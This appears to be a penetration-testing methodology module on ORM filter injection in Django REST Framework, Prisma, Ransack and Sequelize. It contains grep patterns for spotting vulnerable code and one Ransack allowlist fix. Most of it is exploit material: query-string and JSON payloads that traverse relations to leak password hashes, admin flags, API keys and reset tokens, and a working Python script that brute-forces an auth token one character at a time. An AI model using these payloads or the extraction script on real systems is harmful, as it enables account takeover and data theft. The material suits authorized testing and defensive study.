# VULN MODULE — ORM Leak / Mass Assignment via Filter Injection
# Asset: webapp
# CWE-943 / CWE-915 | Report prefix: WEB-ORM

## THREAT MODEL

ORM filter injection occurs when user-controlled input is passed directly to ORM
query builders that support dynamic filtering syntax. Attackers can inject additional
filter conditions to bypass authorization, enumerate data, or access admin records.

Distinct from mass assignment (WEB-MASS): this attack targets the QUERY layer (WHERE
clauses), not the assignment layer (UPDATE/INSERT fields).

Attack surface:
- REST APIs with `?filter[field]=value` query parameter patterns
- Admin panels using ORM-powered search
- Frameworks: Django REST Framework, Prisma, Ransack (Rails), ActiveRecord, Sequelize

## VULNERABILITY CLASSES

1. Django REST Framework filter injection  CWE-943 — `__` traversal to related models
2. Prisma select/include injection         CWE-943 — nested relation disclosure
3. Ransack `q[]` injection                 CWE-943 — relation traversal + enum
4. ActiveRecord where() injection          CWE-89  — raw SQL via string interpolation
5. Sequelize Op injection                  CWE-943 — operator object injection

## WHITEBOX PATTERNS

```bash
# Django — filterset or direct request.data to queryset
grep -rn "request\.data\|request\.query_params\|request\.GET" \
  --include="*.py" -A5 | grep -i "filter\|objects\.\|queryset"

# Django REST Framework FilterSet
grep -rn "FilterSet\|DjangoFilterBackend\|filterset_fields\|filter_backends" \
  --include="*.py"
# Check filterset_fields — are sensitive fields like password, token, is_admin included?

# Prisma (Node.js)
grep -rn "prisma\.\|PrismaClient" --include="*.ts" --include="*.js" -A10 | \
  grep -i "findMany\|findFirst\|where.*req\.\|include.*req\."

# Ransack (Ruby on Rails)
grep -rn "params\[:q\]\|ransack\|Ransackable\|ransackable_attributes" \
  --include="*.rb" -A5

# Sequelize
grep -rn "findAll\|findOne\|where.*req\.\|Op\." --include="*.js" --include="*.ts" -A5
```

## DJANGO REST FRAMEWORK — FILTER INJECTION

### Exploit: `__` (double underscore) traversal to sensitive related fields

Django ORM uses `field__lookup` syntax. If `filterset_fields` or `filter_backends`
expose this without allowlisting, an attacker can traverse relations:

```bash
# List all users where their password hash starts with 'pbkdf2' (confirm hash type)
GET /api/users/?password__startswith=pbkdf2

# Access related model via ForeignKey traversal:
GET /api/orders/?user__is_admin=True

# Enumerate admin users:
GET /api/orders/?user__is_staff=True&user__is_superuser=True

# Leak API token via icontains:
GET /api/orders/?user__auth_token__key__startswith=abc

# Blind extraction (character by character):
GET /api/orders/?user__auth_token__key__startswith=a   # 1 result = 'a'
GET /api/orders/?user__auth_token__key__startswith=ab  # 1 result = 'ab'
# Continue until no results → token enumerated

# Access password reset token:
GET /api/orders/?user__password_reset_tokens__token__startswith=x
```

### PoC: Python blind token extraction

```python
import requests, string

BASE = "https://target.com/api/orders/"
COOKIES = {"sessionid": "YOUR_SESSION"}
known = ""

for i in range(40):
    for c in string.ascii_lowercase + string.digits + "-":
        r = requests.get(BASE,
            params={"user__auth_token__key__startswith": known + c},
            cookies=COOKIES)
        if r.json()["count"] > 0:
            known += c
            print(f"Token so far: {known}")
            break

print(f"Token: {known}")
```

## PRISMA — INCLUDE / SELECT INJECTION

If user input controls `include` or `select` parameters passed to Prisma:

```javascript
// Vulnerable code pattern:
const user = await prisma.user.findMany({
  where: req.query.filter,   // attacker controls filter object
  include: req.query.include // attacker controls included relations
});
```

### Exploit payloads (JSON via query string or body)

```json
// Access related payment methods via include injection:
?include[paymentMethods]=true

// Nested relation traversal:
?include[orders][include][payments]=true

// Select sensitive fields (if select is injectable):
?select[password]=true
?select[apiKey]=true
?select[resetToken]=true
```

## RANSACK (RUBY ON RAILS) — q[] INJECTION

Ransack uses `q[field_predicate]` syntax. Any field accessible on the model can be
queried unless explicitly blocked by `ransackable_attributes`.

```bash
# Basic auth bypass:
GET /admin/users?q[password_cont]=password

# Enumerate admin flag:
GET /admin/users?q[admin_eq]=true

# Relation traversal:
GET /products?q[user_email_cont]=@company.com

# Multi-hop traversal:
GET /orders?q[user_role_name_eq]=admin

# Extract API token character by character:
GET /api/orders?q[user_api_token_start]=a

# Date-based enumeration (confirm user creation date):
GET /admin/users?q[created_at_gteq]=2024-01-01&q[created_at_lteq]=2024-01-31
```

### Ransack fix check

```ruby
# Safe pattern — explicit allowlist:
class User < ApplicationRecord
  def self.ransackable_attributes(auth_object = nil)
    %w[email name created_at]  # password, api_key, reset_token NOT listed
  end
end
```

If `ransackable_attributes` is not overridden → ALL model attributes are accessible.

## SEQUELIZE — OPERATOR INJECTION

```javascript
// Vulnerable:
User.findAll({ where: req.body.filter })

// Exploit (JSON body):
{ "filter": { "password": { "$ne": null } } }      // returns all users
{ "filter": { "email": { "$like": "%admin%" } } }  // find admin
{ "filter": { "isAdmin": true } }                  // admin accounts only
```

When combined with `Content-Type: application/json` — operators pass directly.

## TOOLS

```bash
# No dedicated ORM scanner — manual + Burp Suite parameter fuzzing

# Burp Intruder: fuzz the filter parameter with ORM lookup suffixes:
# __startswith, __contains, __icontains, __gt, __lt, __isnull, __in
# __user__is_admin, __user__auth_token__startswith

# Django debug mode — 500 errors reveal field names and lookup errors
# Filter field does not exist → 400 Bad Request (valid field traversal discovered)
# Filter field exists → 200 (confirm field is accessible)
```
